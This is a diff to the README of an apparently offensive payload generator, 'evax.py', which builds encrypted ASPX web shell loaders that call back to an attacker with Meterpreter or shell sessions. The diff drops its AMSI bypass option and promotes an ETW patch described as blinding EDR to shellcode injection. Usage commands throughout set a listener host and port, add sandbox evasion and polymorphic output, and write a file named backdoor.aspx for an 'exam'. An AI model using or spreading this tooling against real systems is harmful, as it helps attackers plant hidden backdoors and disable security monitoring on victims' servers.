@@ -32,11 +32,24 @@
 |---------|-------------|
 | **Multi-Layer Encryption** | Caesar, XOR, Multi-byte XOR, RC4 |
 | **Sandbox Evasion** | VirtualAllocExNuma, Sleep timers, Resource checks |
-| **AMSI Bypass** | Integrated AMSI patching for PowerShell-based defenses |
-| **ETW Patching** | Disable Event Tracing for Windows |
+| **ETW Patching** | Disable Event Tracing for Windows (blind EDR) |
 | **Polymorphic Code** | Randomized variable names every generation |
 | **Multiple Payloads** | Meterpreter, Shell, Staged/Stageless |
 | **Evasion Levels** | Low, Medium, Max - choose your stealth level |
+
+### Note: Why No AMSI Bypass?
+
+AMSI (Antimalware Scan Interface) **only monitors**:
+- PowerShell scripts
+- VBScript/JScript
+- Office VBA Macros
+
+AMSI **does NOT monitor** ASPX web shells because:
+- ASPX is compiled by IIS/ASP.NET engine
+- It runs as native .NET code, not script
+- AMSI has no visibility into this execution path
+
+**Therefore, AMSI bypass is NOT needed for ASPX shells!**
 
 ---
 
@@ -64,8 +77,8 @@ python3 evax.py -i 192.168.1.100 -p 443
 ### Maximum Evasion
 
 ```bash
-# Full evasion with AMSI bypass and ETW patch
-python3 evax.py -i 192.168.1.100 -p 443 --evasion max --amsi --etw
+# Full evasion with ETW patch
+python3 evax.py -i 192.168.1.100 -p 443 --evasion max --etw
 ```
 
 ### Different Encryption
@@ -84,7 +97,7 @@ python3 evax.py -i 192.168.1.100 -p 443 -e xor_multi
 
 ```
 usage: evax.py [-h] -i LHOST -p LPORT [-o OUTPUT] [-e {caesar,xor,xor_multi,rc4}]
-               [-k KEY] [--evasion {low,medium,max}] [--amsi] [--etw]
+               [-k KEY] [--evasion {low,medium,max}] [--etw]
                [--payload {meterpreter_https,meterpreter_http,meterpreter_tcp,shell_tcp}]
                [--shellcode SHELLCODE] [--staged] [--url URL]
 
@@ -96,8 +109,7 @@ options:
   -e, --encryption      Encryption method: caesar, xor, xor_multi, rc4
   -k, --key             Encryption key (auto-generated if not specified)
   --evasion             Evasion level: low, medium, max
-  --amsi                Include AMSI bypass
-  --etw                 Include ETW patch
+  --etw                 Include ETW patch (recommended for EDR bypass)
   --payload             Payload type (default: meterpreter_https)
   --shellcode           Use shellcode from file
   --staged              Generate staged loader
@@ -189,21 +201,18 @@ python3 evax.py -i 192.168.1.100 -p 443 --evasion max --amsi --etw -e rc4
 
 ## Advanced Options
 
-### AMSI Bypass (`--amsi`)
+### ETW Patch (`--etw`) - Recommended!
 
-Patches AMSI to prevent PowerShell-based detection.
-
-```bash
-python3 evax.py -i 192.168.1.100 -p 443 --amsi
-```
-
-### ETW Patch (`--etw`)
-
-Disables Event Tracing for Windows to avoid logging.
+Disables Event Tracing for Windows to avoid EDR detection.
 
 ```bash
 python3 evax.py -i 192.168.1.100 -p 443 --etw
 ```
+
+**Why ETW Patch is Important:**
+- EDR uses ETW to monitor API calls (VirtualAlloc, CreateThread)
+- Without ETW patch, EDR sees your shellcode injection
+- With ETW patch, EDR is blind to your activity
 
 ### Staged Payload (`--staged`)
 
@@ -253,7 +262,6 @@ python3 evax.py -i 192.168.1.100 -p 4444 --shellcode custom.bin
 # Maximum stealth for exam
 python3 evax.py -i 192.168.119.120 -p 443 \
     --evasion max \
-    --amsi \
     --etw \
     -e rc4 \
     -o backdoor.aspx
@@ -373,12 +381,13 @@ STEP 6: RECEIVE SESSION
 |---------|------|-----------|---------------|
 | Encryption Options | 4 (Caesar/XOR/XOR-Multi/RC4) | 2 | 0 |
 | Sandbox Evasion | ✅ Multiple | ✅ Basic | ❌ |
-| AMSI Bypass | ✅ | ❌ | ❌ |
 | ETW Patch | ✅ | ❌ | ❌ |
 | Polymorphic Variables | ✅ | ✅ | ❌ |
 | Evasion Levels | 3 | 1 | 0 |
 | Staged Payloads | ✅ | ❌ | ❌ |
 | Custom Shellcode | ✅ | ✅ | ❌ |
+
+**Note:** AMSI bypass is not included because ASPX shells don't need it - AMSI only monitors PowerShell/VBScript, not compiled ASPX code.
 
 ---
 
